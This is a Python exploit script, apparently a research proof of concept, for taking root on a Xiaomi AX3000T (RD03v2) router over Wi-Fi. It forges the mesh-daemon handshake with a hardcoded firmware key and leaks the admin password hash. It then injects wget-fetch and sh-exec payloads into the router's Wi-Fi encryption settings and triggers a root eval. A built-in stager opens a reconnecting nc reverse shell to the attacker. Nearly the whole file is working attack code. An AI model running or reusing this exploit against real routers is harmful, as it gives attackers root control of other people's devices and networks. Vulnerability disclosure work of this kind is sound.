#!/usr/bin/env python3
"""Over-the-air root RCE in a gate-open RD03v2 stock 2.0.28 state.

Combines V1 (admin takeover via cab_meshd) and V2 (root command execution via
mgmt_2g/mgmt_5g encryption injection) into a single CAP delivery path
that yields an interactive root reverse shell -- from a client already on
Wi-Fi, without router-admin or mesh credentials, a WAN cable, or user
interaction during the V1/V2 run.

The attack has three phases:

  Phase A — V1 admin takeover.
    Connect to cab_meshd on TCP 19553, forge the constant-key HMAC handshake
    (firmware-global key, SSL_VERIFY_NONE), reach ST_RUNNING, and leak
    web_passwd256 from the sync config. Mint an admin session with
    sha256(nonce || web_passwd256).

  Phase B — Injection plant.
    Using the admin session, write shell payloads into the Wi-Fi encryption
    UCI keys via api/xqnetwork/set_wifi_without_restart (writes UCI without
    restarting the radios, so the Wi-Fi stays up):
      2.4G encryption = '" wget http://ATTACKER:PORT/s -O /tmp/x #'  (fetch)
      5G   encryption = '" sh /tmp/x #'                               (exec)
    encryption passes through hackCheck. These payloads avoid its blocked bytes
    (backtick, semicolon, pipe, dollar, ampersand, and newline) and use permitted
    backslash-quote, spaces, and #. Hardware read-back confirmed that both values
    reached UCI verbatim.

  Phase C — Trigger.
    Open a new cab_meshd connection and send the tested type-4 → type-5 → type-7
    exchange. The type-7 handler has no connection-state comparison, but this PoC
    retains the full validated sequence. type-7 drives
    cap_init, which reads the poisoned encryption values via `uci get` and
    feeds them through mimesh_init.sh:717's `eval` as root. The \" breaks out
    of the JSON double-quote in the eval context; the trailing # comments out
    the rest. The 2.4G value fetches the stager; the 5G value executes it.
    This bypasses check_injection entirely -- the values never pass through
    the C-level blacklist because they are read from UCI by the shell, not
    sent over the mesh wire protocol.

The stager script (served over HTTP) sends a proof-of-concept callback,
self-repairs the Wi-Fi encryption so the AP survives cap_init's reconfig,
and starts a reconnecting reverse shell back to the attacker.

Confirmed end-to-end on physical hardware after minimal initialization left
NETMODE unset:
  - Root callback: GET /pwned?uid=0_user=root_host=XiaoQiang
  - Interactive root shell: BusyBox ash, uid=0(root), Linux XiaoQiang 4.4.60

Prerequisites:
  - Laboratory preparation completed separately: factory reset, then
    `init_router.py --host 192.168.31.1 --reboot`. This script does not create
    the tested gate-open CAP state.
  - Wi-Fi (or LAN) adjacency to an initialized RD03v2 (INITTED=YES).
  - TCP 19553 reachable and get_netmode returning numeric 0. The normal web
    wizard can set whc_cap (4), which blocks this CAP root path.
  - After that preparation, the V1/V2 run needs no router-admin or mesh
    credentials and no additional foothold.

Usage:
    # one-time laboratory preparation after a factory reset:
    python3 init_router.py --host 192.168.31.1 --reboot

    python3 ota_rce.py --host 192.168.31.1
    python3 ota_rce.py --host 192.168.31.1 --attacker 10.0.0.5 --listen-port 9999
    python3 ota_rce.py --host 192.168.31.1 --stager ./my_payload.sh
    python3 ota_rce.py --host 192.168.31.1 --no-trigger   # plant only, don't fire
"""

import argparse
import base64
import hashlib
import hmac
import http.server
import json
import random
import re
import socket
import socketserver
import ssl
import struct
import subprocess
import sys
import textwrap
import threading
import time
import urllib.parse
import urllib.request

# ---- firmware constants ----

CONST = b"838d364d8ed3bd085e150211ea6b3715"  # key literal @0xcabb
VER = 0x1001
HDR = 0x2c


def log(m):
    print(m, flush=True)


# ---- mesh protocol primitives ----


def q_pass(ident: bytes) -> bytes:
    """HMAC-SHA256 with the 'q' key variant (server-verify-incoming)."""
    return base64.b64encode(
        hmac.new(b"q" + CONST[1:], ident, hashlib.sha256).digest()
    )


def mesh_hdr(typ, blen):
    h = bytearray(HDR)
    h[0:2] = struct.pack(">H", VER)
    h[2:4] = struct.pack(">H", blen)
    h[4:6] = struct.pack(">H", typ)
    return bytes(h)


def tls_connect(host, port, timeout=20.0, retries=4):
    """TLS to cab_meshd with no client certificate, retrying slot stalls."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers("ALL:@SECLEVEL=0")
    except ssl.SSLError:
        pass
    s = None
    for i in range(retries):
        try:
            s = ctx.wrap_socket(
                socket.create_connection((host, port), timeout=timeout)
            )
            return s
        except (TimeoutError, socket.timeout, ssl.SSLError, OSError) as e:
            if i == retries - 1:
                raise
            log(
                f"[!] TLS connect {i+1}/{retries} failed ({type(e).__name__}); "
                f"cab_meshd slot busy, waiting 15s"
            )
            time.sleep(15)


def http_call(url, data=None, timeout=45):
    """HTTP request with retries."""
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body)
    req.add_header("Connection", "close")
    for attempt in range(4):
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.read().decode("utf-8", "replace")
        except (urllib.error.URLError, TimeoutError, socket.timeout, OSError) as e:
            if attempt == 3:
                raise
            log(f"    (retry {attempt + 1}: {type(e).__name__})")
            time.sleep(6)


# ---- Phase A: V1 admin takeover ----


def leak_admin_hash(host, port, ident, timeout):
    """Forge the mesh handshake and leak web_passwd256 from the sync config."""
    s = tls_connect(host, port, timeout)
    log(f"[A] TLS up on {host}:{port} ({s.version()}, no client cert)")

    # type-4 auth_req: id@0, pass@0x10
    b4 = bytearray(0xa4)
    b4[0 : len(ident)] = ident
    p = q_pass(ident)
    b4[0x10 : 0x10 + len(p)] = p
    s.sendall(mesh_hdr(4, len(b4)) + bytes(b4))
    log("[A] type-4 auth sent (forged constant-key HMAC)")

    # type-5 -> ST_RUNNING; CAP sends type-6 sync config
    time.sleep(1.0)
    b5 = bytearray(0x20)
    b5[0] = 1
    s.sendall(mesh_hdr(5, len(b5)) + bytes(b5))
    log("[A] type-5 -> ST_RUNNING; waiting for sync config")

    buf = b""
    deadline = time.time() + 8.0
    s.settimeout(1.0)
    cfg = None
    while time.time() < deadline and cfg is None:
        try:
            chunk = s.recv(4096)
        except (socket.timeout, ssl.SSLWantReadError):
            continue
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        while len(buf) >= HDR:
            _, blen, typ = struct.unpack(">HHH", buf[0:6])
            if len(buf) < HDR + blen:
                break
            body, buf = buf[HDR : HDR + blen], buf[HDR + blen :]
            if typ == 6:
                js, je = body.find(b"{"), body.rfind(b"}")
                if js != -1 and je > js:
                    cfg = json.loads(body[js : je + 1])
    try:
        s.close()
    except OSError:
        pass
    if cfg is None:
        raise RuntimeError("no sync config received; is the target in CAP mode?")
    return cfg.get("web_passwd256", "")


def detect_local_mac(host):
    try:
        out = subprocess.run(
            ["ip", "-o", "route", "get", host],
            capture_output=True, text=True, timeout=5,
        ).stdout
        dev = re.search(r"\bdev\s+(\S+)", out)
        if dev:
            return open(f"/sys/class/net/{dev.group(1)}/address").read().strip()
    except Exception:
        pass
    return "00:00:00:00:00:00"


def detect_local_ip(host):
    try:
        out = subprocess.run(
            ["ip", "-o", "route", "get", host],
            capture_output=True, text=True, timeout=5,
        ).stdout
        m = re.search(r"\bsrc\s+(\S+)", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    return None


def mint_admin(host, web_passwd256, mac):
    """sha256(nonce || web_passwd256) -> admin stok."""
    nonce = f"0_{mac}_{int(time.time())}_{random.randint(0, 9999)}"
    password = hashlib.sha256((nonce + web_passwd256).encode()).hexdigest()
    res = json.loads(
        http_call(
            f"http://{host}/cgi-bin/luci/api/xqsystem/login",
            {"username": "admin", "password": password, "nonce": nonce},
        )
    )
    if res.get("code") != 0 or not res.get("token"):
        raise RuntimeError(f"admin login failed: {res}")
    return res["token"]


def api(host, stok, path, params=None):
    url = f"http://{host}/cgi-bin/luci/;stok={stok}/{path}"
    data = urllib.parse.urlencode(params).encode() if params is not None else None
    return urllib.request.urlopen(url, data=data, timeout=45).read().decode()


def require_tested_gate_open_mode(raw):
    """Fail closed unless stock reports the gate-open mode tested on hardware."""
    response = json.loads(raw)
    if not isinstance(response, dict) or response.get("code") != 0:
        raise ValueError("get_netmode did not return code=0")
    mode = response.get("netmode")
    if type(mode) is not int:
        raise ValueError("get_netmode did not return a numeric mode")
    if mode != 0:
        raise ValueError(
            f"NETMODE={mode} is not the gate-open mode verified on hardware; "
            "normal web setup can set whc_cap (4)"
        )
    return mode


# ---- Phase B: injection plant ----


def plant_payloads(host, stok, attacker_ip, serve_port):
    """Write shell payloads into the 2.4G/5G encryption UCI keys.
    Returns the 2.4G SSID (needed for the reconnect instructions)."""
    # read current SSIDs to preserve them
    info = json.loads(api(host, stok, "api/xqnetwork/wifi_detail_all"))
    bands = info.get("info") if isinstance(info, dict) and info.get("code") == 0 else None
    if not isinstance(bands, list) or len(bands) < 2 or not all(
        isinstance(w, dict) and w.get("ssid") for w in bands[:2]
    ):
        raise RuntimeError("wifi_detail_all did not return both expected radios")
    ssid24, ssid5 = bands[0]["ssid"], bands[1]["ssid"]
    log(f"[B] current SSIDs: 2.4G={ssid24!r}  5G={ssid5!r} (preserved)")

    p_fetch = f'\\" wget http://{attacker_ip}:{serve_port}/s -O /tmp/x #'
    p_exec = '\\" sh /tmp/x #'

    r1 = api(host, stok, "api/xqnetwork/set_wifi_without_restart", {
        "wifiIndex": "1", "ssid": ssid24,
        "pwd": "meshpoc12345", "encryption": p_fetch,
    })
    res1 = json.loads(r1)
    if not isinstance(res1, dict) or res1.get("code") != 0:
        raise RuntimeError(f"2.4G plant rejected: {res1}")
    log("[B] 2.4G plant accepted")

    r2 = api(host, stok, "api/xqnetwork/set_wifi_without_restart", {
        "wifiIndex": "2", "ssid": ssid5,
        "pwd": "meshpoc12345", "encryption": p_exec,
    })
    res2 = json.loads(r2)
    if not isinstance(res2, dict) or res2.get("code") != 0:
        raise RuntimeError(f"5G plant rejected: {res2}")
    log("[B] 5G plant accepted")

    # wifi_detail_all uses the same 1=2.4G, 2=5G order as wifiIndex above.
    # Verify both distinct values exactly before a trigger that can close the gate.
    info2 = json.loads(api(host, stok, "api/xqnetwork/wifi_detail_all"))
    stored = info2.get("info") if isinstance(info2, dict) and info2.get("code") == 0 else None
    if not isinstance(stored, list) or len(stored) < 2 or not all(
        isinstance(w, dict) for w in stored[:2]
    ):
        raise RuntimeError("wifi_detail_all read-back did not return both radios")
    if stored[0].get("encryption") != p_fetch or stored[1].get("encryption") != p_exec:
        raise RuntimeError("2.4G fetch or 5G exec payload did not survive read-back")
    log("[B] both payloads read back exactly on the intended radios")
    return ssid24


# ---- Phase C: trigger ----


def fire_trigger(host, port, ident, timeout):
    """type-4 -> type-5 -> type-7 -> cap_init -> eval (root)."""
    s = tls_connect(host, port, timeout)
    log(f"[C] TLS up ({s.version()}, no client cert)")

    # type-4 auth (no plant needed -- the payload is in UCI, not the wire)
    b4 = bytearray(0xa4)
    b4[0 : len(ident)] = ident
    p = q_pass(ident)
    b4[0x10 : 0x10 + len(p)] = p
    s.sendall(mesh_hdr(4, len(b4)) + bytes(b4))
    log("[C] type-4 auth sent")
    time.sleep(1.0)

    # type-5 -> ST_RUNNING
    b5 = bytearray(0x20)
    b5[0] = 1
    s.sendall(mesh_hdr(5, len(b5)) + bytes(b5))
    log("[C] type-5 -> ST_RUNNING")
    time.sleep(1.5)
    s.settimeout(2.0)
    try:
        s.recv(4096)
    except (socket.timeout, ssl.SSLWantReadError, OSError):
        pass

    # type-7 -> cap_init -> eval reads poisoned encryption from UCI -> root RCE
    b7 = bytearray(0x110)
    b7[0] = 1
    s.sendall(mesh_hdr(7, len(b7)) + bytes(b7))
    log("[C] type-7 trigger sent -> cap_init -> mimesh_init eval (root)")
    time.sleep(4.0)
    try:
        s.close()
    except OSError:
        pass


# ---- stager + HTTP server ----


DEFAULT_STAGER = textwrap.dedent("""\
    #!/bin/sh
    export PATH=/usr/sbin:/usr/bin:/sbin:/bin:$PATH
    # proof callback
    wget -q -O /dev/null "http://{attacker}:{serve_port}/pwned?uid=$(id -u)_user=$(id -un)_host=$(uname -n)" 2>/dev/null
    {{ id; uname -a; }} > /tmp/OTA_ROOT_PROOF 2>&1
    # self-repair: restore valid encryption after cap_init's reconfig
    (
      for i in 1 2 3 4 5; do sleep 6
        changed=0
        for s in $(uci show wireless 2>/dev/null | sed -n 's/^wireless\\.\\([^.]*\\)=wifi-iface$/\\1/p'); do
          e=$(uci -q get wireless.$s.encryption 2>/dev/null)
          case "$e" in *wget*|*tmp/x*|*sh\\ /*) uci -q set wireless.$s.encryption='psk2'; uci -q set wireless.$s.key='meshpoc12345'; changed=1;; esac
        done
        [ "$changed" = 1 ] && {{ uci -q commit wireless; wifi reload; }}
      done
    ) &
    # process-lifetime reconnecting reverse shell (after self-repair settles)
    (
      sleep 40
      while true; do
        rm -f /tmp/.rs; mkfifo /tmp/.rs
        /bin/sh -i < /tmp/.rs 2>&1 | nc {attacker} {listen_port} > /tmp/.rs 2>/dev/null
        sleep 10
      done
    ) &
""")


def build_stager(stager_path, attacker, serve_port, listen_port):
    if stager_path:
        return open(stager_path, "rb").read()
    return DEFAULT_STAGER.format(
        attacker=attacker,
        serve_port=serve_port,
        listen_port=listen_port,
    ).encode()


class StagerHandler(http.server.BaseHTTPRequestHandler):
    stager_content = b""
    got_callback = threading.Event()

    def log_message(self, fmt, *a):
        line = fmt % a
        tag = "  <<< CALLBACK" if "/pwned" in line else ""
        log(f"[HTTP] {self.client_address[0]} {line}{tag}")

    def do_GET(self):
        if self.path.startswith("/pwned"):
            log(f"[*] *** ROOT CALLBACK: {self.path} ***")
            StagerHandler.got_callback.set()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
            return
        if self.path == "/s" or self.path.startswith("/s?"):
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(self.stager_content)))
            self.end_headers()
            self.wfile.write(self.stager_content)
            return
        self.send_response(404)
        self.end_headers()


def start_http_server(stager_content, port):
    StagerHandler.stager_content = stager_content
    socketserver.TCPServer.allow_reuse_address = True
    try:
        httpd = socketserver.TCPServer(("0.0.0.0", port), StagerHandler)
    except OSError as e:
        log(f"[-] cannot bind 0.0.0.0:{port} ({e})")
        log("[-] Another ota_rce.py is most likely still running. This script holds")
        log("[-] the HTTP server open until Ctrl-C deliberately: the stager re-fetches")
        log("[-] /s on every reconnect, so the server has to outlive the first")
        log("[-] callback. Stop the other instance, or use --serve-port.")
        raise SystemExit(1)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd


# ---- main ----


def main():
    ap = argparse.ArgumentParser(
        description="Over-the-air root RCE on a gate-open Xiaomi AX3000T (RD03v2).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Combines V1 (admin hash leak via cab_meshd) and V2 (root eval via
            encryption injection) into a single over-the-air CAP delivery
            that yields an interactive root reverse shell.

            The tested attack is over Wi-Fi, requires no router-admin or mesh
            credentials, and needs NETMODE=0. The router does not reboot; Wi-Fi
            briefly drops and returns with the self-repaired WPA2 configuration.

            Laboratory preparation before this script:
              python3 init_router.py --host 192.168.31.1 --reboot

            Example:
              Terminal 1:  python3 ota_rce.py --host 192.168.31.1
              Terminal 2:  nc -l -p 4444   (catch the reverse shell)
        """),
    )
    ap.add_argument("--host", default="192.168.31.1",
                    help="target router IP (default: 192.168.31.1)")
    ap.add_argument("--port", type=int, default=19553,
                    help="cab_meshd port (default: 19553)")
    ap.add_argument("--attacker", default=None,
                    help="attacker IP (auto-detected from route if omitted)")
    ap.add_argument("--serve-port", type=int, default=8000,
                    help="HTTP port to serve the stager (default: 8000)")
    ap.add_argument("--listen-port", type=int, default=4444,
                    help="port for the reverse shell callback (default: 4444)")
    ap.add_argument("--stager", default=None,
                    help="path to a custom stager script (default: built-in)")
    ap.add_argument("--id", default="ota0001",
                    help="mesh peer identity string (arbitrary)")
    ap.add_argument("--timeout", type=float, default=20.0,
                    help="TLS connect timeout (default: 20)")
    ap.add_argument("--no-trigger", action="store_true",
                    help="plant the payloads but do NOT fire the trigger")
    args = ap.parse_args()

    # resolve attacker IP
    attacker = args.attacker or detect_local_ip(args.host)
    if not attacker:
        log("[-] could not detect attacker IP; use --attacker")
        return 1
    log(f"[*] target: {args.host}:{args.port}  attacker: {attacker}")
    log(f"[*] HTTP server :{args.serve_port}  reverse shell :{args.listen_port}")

    # start HTTP server with the stager
    stager = build_stager(args.stager, attacker, args.serve_port, args.listen_port)
    httpd = start_http_server(stager, args.serve_port)
    log(f"[*] HTTP server up on 0.0.0.0:{args.serve_port}  (serving /s)")

    # Phase A
    log("")
    log("=" * 60)
    log("  Phase A: V1 admin takeover")
    log("=" * 60)
    h256 = leak_admin_hash(args.host, args.port, args.id.encode(), args.timeout)
    if not h256:
        log("[-] no web_passwd256 in sync config")
        return 1
    log(f"[A] leaked web_passwd256 = {h256[:16]}...")
    mac = detect_local_mac(args.host)
    stok = mint_admin(args.host, h256, mac)
    log(f"[A] admin session minted: stok={stok}")

    # Confirm the gate-open mode used in the physical test before writing any
    # Wi-Fi setting. Normal stock web setup can set whc_cap, where do_cap_init
    # skips the eval; a prior completed cap_init can produce the same value.
    # Unknown/error replies must never be treated as "armed".
    try:
        netmode = require_tested_gate_open_mode(
            api(args.host, stok, "api/xqnetwork/get_netmode")
        )
    except Exception as e:                                       # noqa: BLE001
        log(f"[-] CAP root path not confirmed open: {e}")
        log("[-] Nothing was planted or triggered. See v2-root-rce.md for the")
        log("[-] required gate-open CAP preparation and normal-wizard boundary.")
        return 1
    log(f"[*] NETMODE={netmode} (tested gate-open state)")

    # Phase B
    log("")
    log("=" * 60)
    log("  Phase B: injection plant")
    log("=" * 60)
    try:
        ssid24 = plant_payloads(args.host, stok, attacker, args.serve_port)
    except Exception as e:                                       # noqa: BLE001
        log(f"[-] payload plant/read-back failed: {e}")
        log("[-] No trigger fired. Some Wi-Fi UCI values may have changed;")
        log("[-] inspect and restore them before rebooting the router.")
        return 1
    log("[B] payloads planted in UCI (Wi-Fi unchanged)")

    if args.no_trigger:
        log("")
        log("[*] --no-trigger: stopping before Phase C.")
        log("[*] The encryption values are planted; inspect with:")
        log(f"    curl 'http://{args.host}/cgi-bin/luci/;stok={stok}/"
            "api/xqnetwork/wifi_detail_all'")
        return 0

    # Phase C
    log("")
    log("=" * 60)
    log("  Phase C: trigger (root RCE)")
    log("=" * 60)
    fire_trigger(args.host, args.port, args.id.encode(), args.timeout)
    log("[C] trigger sent — cap_init will read poisoned UCI and eval as root")

    # wait for callback
    log("")
    log("[*] waiting for root callback on /pwned ...")
    log(f"[*] the device will fetch http://{attacker}:{args.serve_port}/s "
        "and execute it as root")
    log(f"[*] after self-repair (~40s), a reverse shell will connect to "
        f"{attacker}:{args.listen_port}")
    log(f"[*] catch it with:  nc -l -p {args.listen_port}")
    log("")

    if StagerHandler.got_callback.wait(timeout=30.0):
        log("[+] root callback received — arbitrary code executed as uid=0")
    else:
        log("[!] no callback within 30s (the Wi-Fi may have dropped; "
            "the stager still runs on the device)")

    log("")
    log("[*] cap_init may change NETMODE; check the current state before any rerun")
    log("")
    log("=" * 60)
    log("  Waiting for Wi-Fi self-repair")
    log("=" * 60)
    log("[*] the AP will go down briefly while cap_init reconfigures it")
    log("[*] the self-repair payload restores it as WPA2 in ~30-40s")
    log("")

    for remaining in range(45, 0, -1):
        time.sleep(1)
        if remaining % 10 == 0 or remaining <= 5:
            log(f"[*] waiting for self-repair... {remaining}s")

    log("")
    log("!" * 60)
    log("  ACTION REQUIRED: reconnect to the Wi-Fi network")
    log("!" * 60)
    log(f"[!] the AP is now WPA2 — reconnect your laptop:")
    log(f"[!]   nmcli dev wifi connect {ssid24} password meshpoc12345")
    log(f"[!] if that fails with 'key-mgmt: property is missing', you still have the")
    log(f"[!]   saved OPEN profile for this SSID from the factory stage, and it")
    log(f"[!]   shadows the new WPA2 one. Forget it, then retry:")
    log(f"[!]     nmcli con delete <your open profile for {ssid24}>")
    log(f"[!] then start the reverse shell listener in another terminal:")
    log(f"[!]   nc -l -p {args.listen_port}")
    log(f"[!] the device reconnects every 10s, so the shell appears shortly")
    log("")

    # keep the HTTP server alive for the stager fetch + callbacks
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log("\n[*] shutting down")
        httpd.shutdown()
    return 0


if __name__ == "__main__":
    sys.exit(main())
